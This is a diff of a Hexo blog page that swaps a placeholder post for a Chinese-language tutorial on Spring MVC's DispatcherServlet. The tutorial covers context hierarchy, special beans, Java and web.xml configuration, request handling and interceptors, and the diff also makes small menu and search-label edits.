@@ -111,7 +111,7 @@
       apiKey: 'dd999b30a63c88fb422dc71142c6b7bc',
       indexName: 'jamesblog_hexo',
       hits: {"per_page":10},
-      labels: {"input_placeholder":"搜索文章标题或内容","hits_empty":"没有在这个星球上找到: ${query}","hits_stats":"${hits} 搜索完成，用时： ${time} ms"}
+      labels: {"input_placeholder":"搜索文章标题或内容","hits_empty":"没有在这个星球上找到: ${query}","hits_stats":"共找到 ${hits} 条结果，用时： ${time} ms"}
     }
   };
 </script>
@@ -230,32 +230,12 @@
         </li>
       
         
-        <li class="menu-item menu-item-schedule">
-          <a href="/schedule/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
-            
-            日程表
-          </a>
-        </li>
-      
-        
         <li class="menu-item menu-item-sitemap">
-          <a href="/sitemap.xml" rel="section">
+          <a href="/baidusitemap.xml" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
             
             站点地图
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-commonweal">
-          <a href="/404/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
-            
-            公益404
           </a>
         </li>
       
@@ -330,7 +310,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="/2018/03/29/hello-world/">
+    <link itemprop="mainEntityOfPage" href="/2018/03/29/2017-01-01-SpringMVC 解析之 DispatcherServlet/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="摆码王子">
@@ -349,7 +329,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/03/29/hello-world/" itemprop="url">Hello World</a></h1>
+                <a class="post-title-link" href="/2018/03/29/2017-01-01-SpringMVC 解析之 DispatcherServlet/" itemprop="url">SpringMVC 解析之 DispatcherServlet</a></h1>
         
 
         <div class="post-meta">
@@ -361,8 +341,396 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-29T10:19:14+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-29T20:31:22+08:00">
                 2018-03-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/后端/" itemprop="url" rel="index">
+                    <span itemprop="name">后端</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Spring-MVC-是什么"><a href="#Spring-MVC-是什么" class="headerlink" title="Spring MVC 是什么"></a>Spring MVC 是什么</h1><p>Spring Web MVC （Spring MVC) 是一套以 Servlet API 为基础平台的优雅的 Web 框架，一直是 Spring Framework 中重要的一个组成部分。 正式名称 “Spring Web MVC” 来自其源模块 spring-webmvc 的名称，但它通常被称为“Spring MVC”。</p>
+<p>与 Spring Web MVC 并行，Spring Framework 5.0 引入了一个 Reactive stack —— Web框架，其名称 Spring WebFlux 也基于它的源模块 spring-webflux。</p>
+<h1 id="DispatcherServlet"><a href="#DispatcherServlet" class="headerlink" title="DispatcherServlet"></a>DispatcherServlet</h1><p>与许多其他 Web 框架一样，Spring MVC 同样围绕前端页面的控制器模式 (Controller) 进行设计，其中最为核心的 Servlet —— DispatcherServlet 为来自客户端的请求处理提供通用的方法，而实际的工作交由可自定义配置的组件来执行。 这种模型使用方式非常灵活，可以满足多样化的项目需求。</p>
+<p>和任何普通的 Servlet 一样，DispatcherServlet 需要根据 Servlet 规范使用 Java 代码配置或在 web.xml 文件中声明请求和 Servlet 的映射关系。 DispatcherServlet 通过读取 Spring 的配置来发现它在请求映射，视图解析，异常处理等方面所依赖的组件。</p>
+<p>以下是注册和初始化 DispatcherServlet 的 Java 代码配置示例。 该类将被 Servlet 容器自动检测到：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyWebApplicationInitializer</span> <span class="keyword">implements</span> <span class="title">WebApplicationInitializer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStartup</span><span class="params">(ServletContext servletCxt)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载 Spring Web Application 的配置</span></span><br><span class="line">        AnnotationConfigWebApplicationContext ac = <span class="keyword">new</span> AnnotationConfigWebApplicationContext();</span><br><span class="line">        ac.register(AppConfig.class);</span><br><span class="line">        ac.refresh();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建并注册 DispatcherServlet</span></span><br><span class="line">        DispatcherServlet servlet = <span class="keyword">new</span> DispatcherServlet(ac);</span><br><span class="line">        ServletRegistration.Dynamic registration = servletCxt.addServlet(<span class="string">"app"</span>, servlet);</span><br><span class="line">        registration.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        registration.addMapping(<span class="string">"/app/*"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>以下是在 web.xml 中注册和初始化 DispatcherServlet 的方法：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Spring 上下文的配置 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/app-context.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>app<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span><span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>app<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- "/*" 表示将所有请求交由 DispatcherServlet 处理 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="1-应用上下文的层次结构"><a href="#1-应用上下文的层次结构" class="headerlink" title="1. 应用上下文的层次结构"></a>1. 应用上下文的层次结构</h1><p>DispatcherServlet 依赖于一个 WebApplicationContext（对普通 ApplicationContext 的功能扩展）来实现自己的配置。 WebApplicationContext 中包含了一个指向它所关联的 ServletContext 和 Servlet 的链接。 它同时还绑定到 Servlet 上下文中，以便应用程序可以使用 RequestContextUtils 中的静态方法在 WebApplicationContext 进行查找，来判断是否需要调用 DispatcherServlet 中的方法。</p>
+<p>对于只有一个 WebApplicationContext 应用程序来说，这已经可以满足使用了。 同时也可以使用具有层次结构的上下文，其中有一个根上下文（或者叫基上下文） 被多个 DispatcherServlet（或其他普通 Servlet）实例所共享，每个实例都有属于自己的子上下文配置。</p>
+<p>根上下文通常包含被多个 Servlet 实例共享的公共 bean，例如数据仓库和业务。 这些 bean 被继承下来使用，还可以在特定的 Servlet 的子上下文中重写（即重新声明一个 bean 的配置），子上下文中拥有该 Servlet 所独有的局部 bean 实例：</p>
+<p><img src="https://docs.spring.io/spring/docs/current/spring-framework-reference/images/mvc-context-hierarchy.png" alt=""></p>
+<p>以下是使用 WebApplicationContext 层次结构的示例配置：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyWebAppInitializer</span> <span class="keyword">extends</span> <span class="title">AbstractAnnotationConfigDispatcherServletInitializer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt;[] getRootConfigClasses() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Class&lt;?&gt;[] &#123; RootConfig.class &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt;[] getServletConfigClasses() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Class&lt;?&gt;[] &#123; App1Config.class &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> String[] getServletMappings() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String[] &#123; <span class="string">"/app1/*"</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在 web.xml 中的配置</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 根上下文的配置 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/root-context.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>app1<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- app1 专属的的子上下文 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/app1-context.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>app1<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/app1/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="2-带有特殊功能的-Bean"><a href="#2-带有特殊功能的-Bean" class="headerlink" title="2. 带有特殊功能的 Bean"></a>2. 带有特殊功能的 Bean</h1><p>DispatcherServlet 依靠这些特殊的 bean 来处理请求并返回响应。 这些特殊的 bean 是指实现 WebFlux 框架协议的，同样由 Spring 管理的对象。 这些对象都含有一套默认的配置，但也可以自定义各种属性，从而进行灵活扩展或功能改写。</p>
+<table>
+<thead>
+<tr>
+<th>bean 类名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td> HandlerMapping</td>
+<td>将请求映射到处理程序以及用于预处理和后续处理的一系列拦截器。 这种映射有着一套标准，具体的功能因 HandlerMapping 实现而异。            HandlerMapping 的两个最主要实现是 RequestMappingHandlerMapping 和 SimpleUrlHandlerMapping ,前者支持 @RequestMapping 注释方法，它为请求的处理进行 URI 映射的注册。</td>
+</tr>
+<tr>
+<td> HandlerAdapter</td>
+<td>协助 DispatcherServlet 调用匹配请求映射的处理程序，且不需要关心如何调用处理程序以及处理程序的任何细节。 例如，调用带注释的控制器中的方法需要先对 @RequestMapping 等注释进行解析。 HandlerAdapter 的主要功能是屏蔽 DispatcherServlet 的实现细节。</td>
+</tr>
+<tr>
+<td> HandlerExceptionResolver</td>
+<td>包含各种异常的解决方法，可以将不同的异常映射到响应的处理程序或页面等。</td>
+</tr>
+<tr>
+<td> ViewResolver</td>
+<td>将处理程序中的方法返回值（字符串）的逻辑视图名称解析为实际视图，来将响应返回给客户端。</td>
+</tr>
+<tr>
+<td> LocaleResolver, LocaleContextResolver</td>
+<td>识别客户端的当前区域设置以估测大概的时区，从而能够返回响应地区的国际化视图。</td>
+</tr>
+<tr>
+<td> ThemeResolver</td>
+<td>解析当前 Web 应用程序可用的主题，例如提供个性化布局。</td>
+</tr>
+<tr>
+<td> MultipartResolver</td>
+<td>在相应的解析库的辅助下，对 multi-part 请求（比如浏览器的表单文件上传）进行解析。</td>
+</tr>
+<tr>
+<td> FlashMapManager</td>
+<td>存储和检索可将参数从一个请求传递到另一个请求的“输入”和“输出”的 FlashMap，通常通过重定向来实现。</td>
+</tr>
+</tbody>
+</table>
+<h1 id="3-Web-MVC-的配置"><a href="#3-Web-MVC-的配置" class="headerlink" title="3. Web MVC 的配置"></a>3. Web MVC 的配置</h1><p>应用程序可以单独声明上文中“带有特殊功能的 Bean”中列出的基础版的 bean。 DispatcherServlet 扫描这些 bean 所属的 WebApplicationContext。 如果没有匹配的 bean 类型，它将返回 DispatcherServlet.properties 中的默认类型。</p>
+<p>在大多数情况下，MVC 默认配置是最好的实现。 它采用 Java 代码或 XML 文件来配置所需的 bean，同时提供更高级别的配置回调 API 用于改写默认配置。</p>
+<h1 id="4-Servlet-的配置"><a href="#4-Servlet-的配置" class="headerlink" title="4.  Servlet 的配置"></a>4.  Servlet 的配置</h1><p>在 Servlet 3.0 以上的版本中，可以用 Java代码或与 web.xml 文件相结合来配置 Servlet 容器。 以下是用 Java 代码注册 DispatcherServlet 的示例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.WebApplicationInitializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyWebApplicationInitializer</span> <span class="keyword">implements</span> <span class="title">WebApplicationInitializer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStartup</span><span class="params">(ServletContext container)</span> </span>&#123;</span><br><span class="line">        XmlWebApplicationContext appContext = <span class="keyword">new</span> XmlWebApplicationContext();</span><br><span class="line">        appContext.setConfigLocation(<span class="string">"/WEB-INF/spring/dispatcher-config.xml"</span>);</span><br><span class="line"></span><br><span class="line">        ServletRegistration.Dynamic registration = container.addServlet(<span class="string">"dispatcher"</span>, <span class="keyword">new</span> DispatcherServlet(appContext));</span><br><span class="line">        registration.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        registration.addMapping(<span class="string">"/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>WebApplicationInitializer 是 Spring MVC 提供的一个接口，其所有实现类都可以被扫描到，并自动用于初始化任何 Servlet 3 容器。 AbstractDispatcherServletInitializer （WebApplicationInitializer 的一个抽象父类）的实现类可以通过覆盖方法来配置 Servlet 请求映射、DispatcherServlet 配置文件的目录，这样很简单的就实现了 DispatcherServlet 的配置。</p>
+<p>如果通过 Java 代码来配置 Spring 的话，需要这样做：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyWebAppInitializer</span> <span class="keyword">extends</span> <span class="title">AbstractAnnotationConfigDispatcherServletInitializer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt;[] getRootConfigClasses() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt;[] getServletConfigClasses() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Class&lt;?&gt;[] &#123; MyWebConfig.class &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> String[] getServletMappings() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String[] &#123; <span class="string">"/"</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果用 xml 文件来配置 Spring，则只需定义一个 AbstractDispatcherServletInitializer 实现类即可：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyWebAppInitializer</span> <span class="keyword">extends</span> <span class="title">AbstractDispatcherServletInitializer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> WebApplicationContext <span class="title">createRootApplicationContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> WebApplicationContext <span class="title">createServletApplicationContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        XmlWebApplicationContext cxt = <span class="keyword">new</span> XmlWebApplicationContext();</span><br><span class="line">        cxt.setConfigLocation(<span class="string">"/WEB-INF/spring/dispatcher-config.xml"</span>);</span><br><span class="line">        <span class="keyword">return</span> cxt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> String[] getServletMappings() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String[] &#123; <span class="string">"/"</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>AbstractDispatcherServletInitializer 还可以轻松添加 Filter 并自动映射到 DispatcherServlet 中:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyWebAppInitializer</span> <span class="keyword">extends</span> <span class="title">AbstractDispatcherServletInitializer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Filter[] getServletFilters() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Filter[] &#123;</span><br><span class="line">            <span class="keyword">new</span> HiddenHttpMethodFilter(), <span class="keyword">new</span> CharacterEncodingFilter() &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不同的 Filter 都会以不同的名称注册，同时映射到 DispatcherServlet 中。</p>
+<p>The isAsyncSupported protected method of AbstractDispatcherServletInitializer provides a single place to enable async support on the DispatcherServlet and all filters mapped to it. By default this flag is set to true.</p>
+<p>AbstractDispatcherServletInitializer 中的 isAsyncSupported() 方法可以设置各个 Filter 是否开启异步支持。</p>
+<p>如果还想更加细化自定义配置，可以通过重写 createDispatcherServlet() 方法来实现。</p>
+<h1 id="5-处理请求"><a href="#5-处理请求" class="headerlink" title="5. 处理请求"></a>5. 处理请求</h1><p>DispatcherServlet 处理请求的规则：</p>
+<ul>
+<li>在请求中查找并绑定 WebApplicationContext，它可以作为参数被控制器中的方法使用。 默认绑定到 DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE 对应的值。</li>
+<li>区域解析器 (LocaleResolver) 也绑定到请求上，它可以在请求解析、呈现视图、准备数据等过程中将信息解析为当前的区域环境。如果无需解析这些信息，可以不用管它。</li>
+<li>主题解析器用来决定使用哪个主题。 如果你不使用主题，可以忽略掉它。</li>
+<li>如果在应用中声明了 multipart file resolver，则会对请求进行 multipart 检查；如果发现了 multiparts，请求会被包装成 MultipartHttpServlet 来进行处理。</li>
+<li>如果返回模型，则会解析并返回视图。 如果没有返回模型（由于其他处理程序拦截了请求，可能出于安全原因），则不会返回视图，因为可能已经有响应返回给客户端了。</li>
+</ul>
+<p>WebApplicationContext 中声明的 HandlerExceptionResolver bean 可以解析请求处理时抛出的异常。 可以给异常解析器进行特定的配置来解决特定的异常。</p>
+<p>DispatcherServlet 还支持返回最后修改日期。 DispatcherServlet 扫描注册的映射关系并，判断找到的处理程序是否实现了 LastModified 接口。 如果实现了，则将 LastModified 接口的 long getLastModified（request）方法的返回值返回给客户端。</p>
+<p>在 web.xml 中，可以通过配置 Servlet 的初始化参数（init-param）来自定义一个 DispatcherServlet 的实例。</p>
+<p><em>DispatcherServlet 的初始化参数</em></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td> contextClass</td>
+<td>WebApplicationContext 的实现类，初始化 Servlet 的上下文，默认为 XmlWebApplicationContext</td>
+</tr>
+<tr>
+<td> contextConfigLocation</td>
+<td>作为参数传递给在 contextClass 中指定上下文实例，用于标识上下文的位置，接受多个字符串（以逗号分隔），如果同一个 bean 的配置在多个上下文中出现，则以最后一个为准。</td>
+</tr>
+<tr>
+<td> namespace</td>
+<td>WebApplicationContext 的命名空间，默认为 <servlet-name> 元素中的值加上“servlet”。比如，<servlet-name>app</servlet-name>，那么，命名空间为 appServlet。</servlet-name></td>
+</tr>
+</tbody>
+</table>
+<h1 id="6-拦截器"><a href="#6-拦截器" class="headerlink" title="6. 拦截器"></a>6. 拦截器</h1><p>所有 HandlerMapping 的实现类都支持使用拦截器，特别是将某些功能只应用到特定的请求上时（比如判断权限），拦截器就非常有用。 拦截器必须实现 org.springframework.web.servlet 包中的 HandlerInterceptor，它提供了三个方法，供不同时刻来调用：</p>
+<ul>
+<li>preHandle(..)：在请求处理前执行…</li>
+<li>postHandle(..)：在请求处理后执行…</li>
+<li>afterCompletion(..)：在请求处理完全结束后执行…</li>
+</ul>
+<p>preHandle(..) 方法返回布尔值，可以通过这一点选择来切断或继续请求的处理链。当返回 true 的时候，处理器链会继续执行；返回 false 的时候， DispatcherServlet 就会认为拦截器已经处理了请求或返回了视图，并不会继续被处理链中的其他处理器或拦截器所处理。</p>
+<p>请注意，postHandle(..) 对使用 @ResponseBody 和 ResponseEntity 方法的用处不大，在 HandlerAdapter 中， postHandle(..) 调用之前就已经提交响应了。 所以这时再修改响应什么用也没有了。 这种情况下，可以实现 ResponseBodyAdvice，并将其声明为 Controller Advice bean （在 Controller 类上添加 @ControllerAdvice 注解）或直接在 RequestMappingHandlerAdapter 中进行配置。</p>
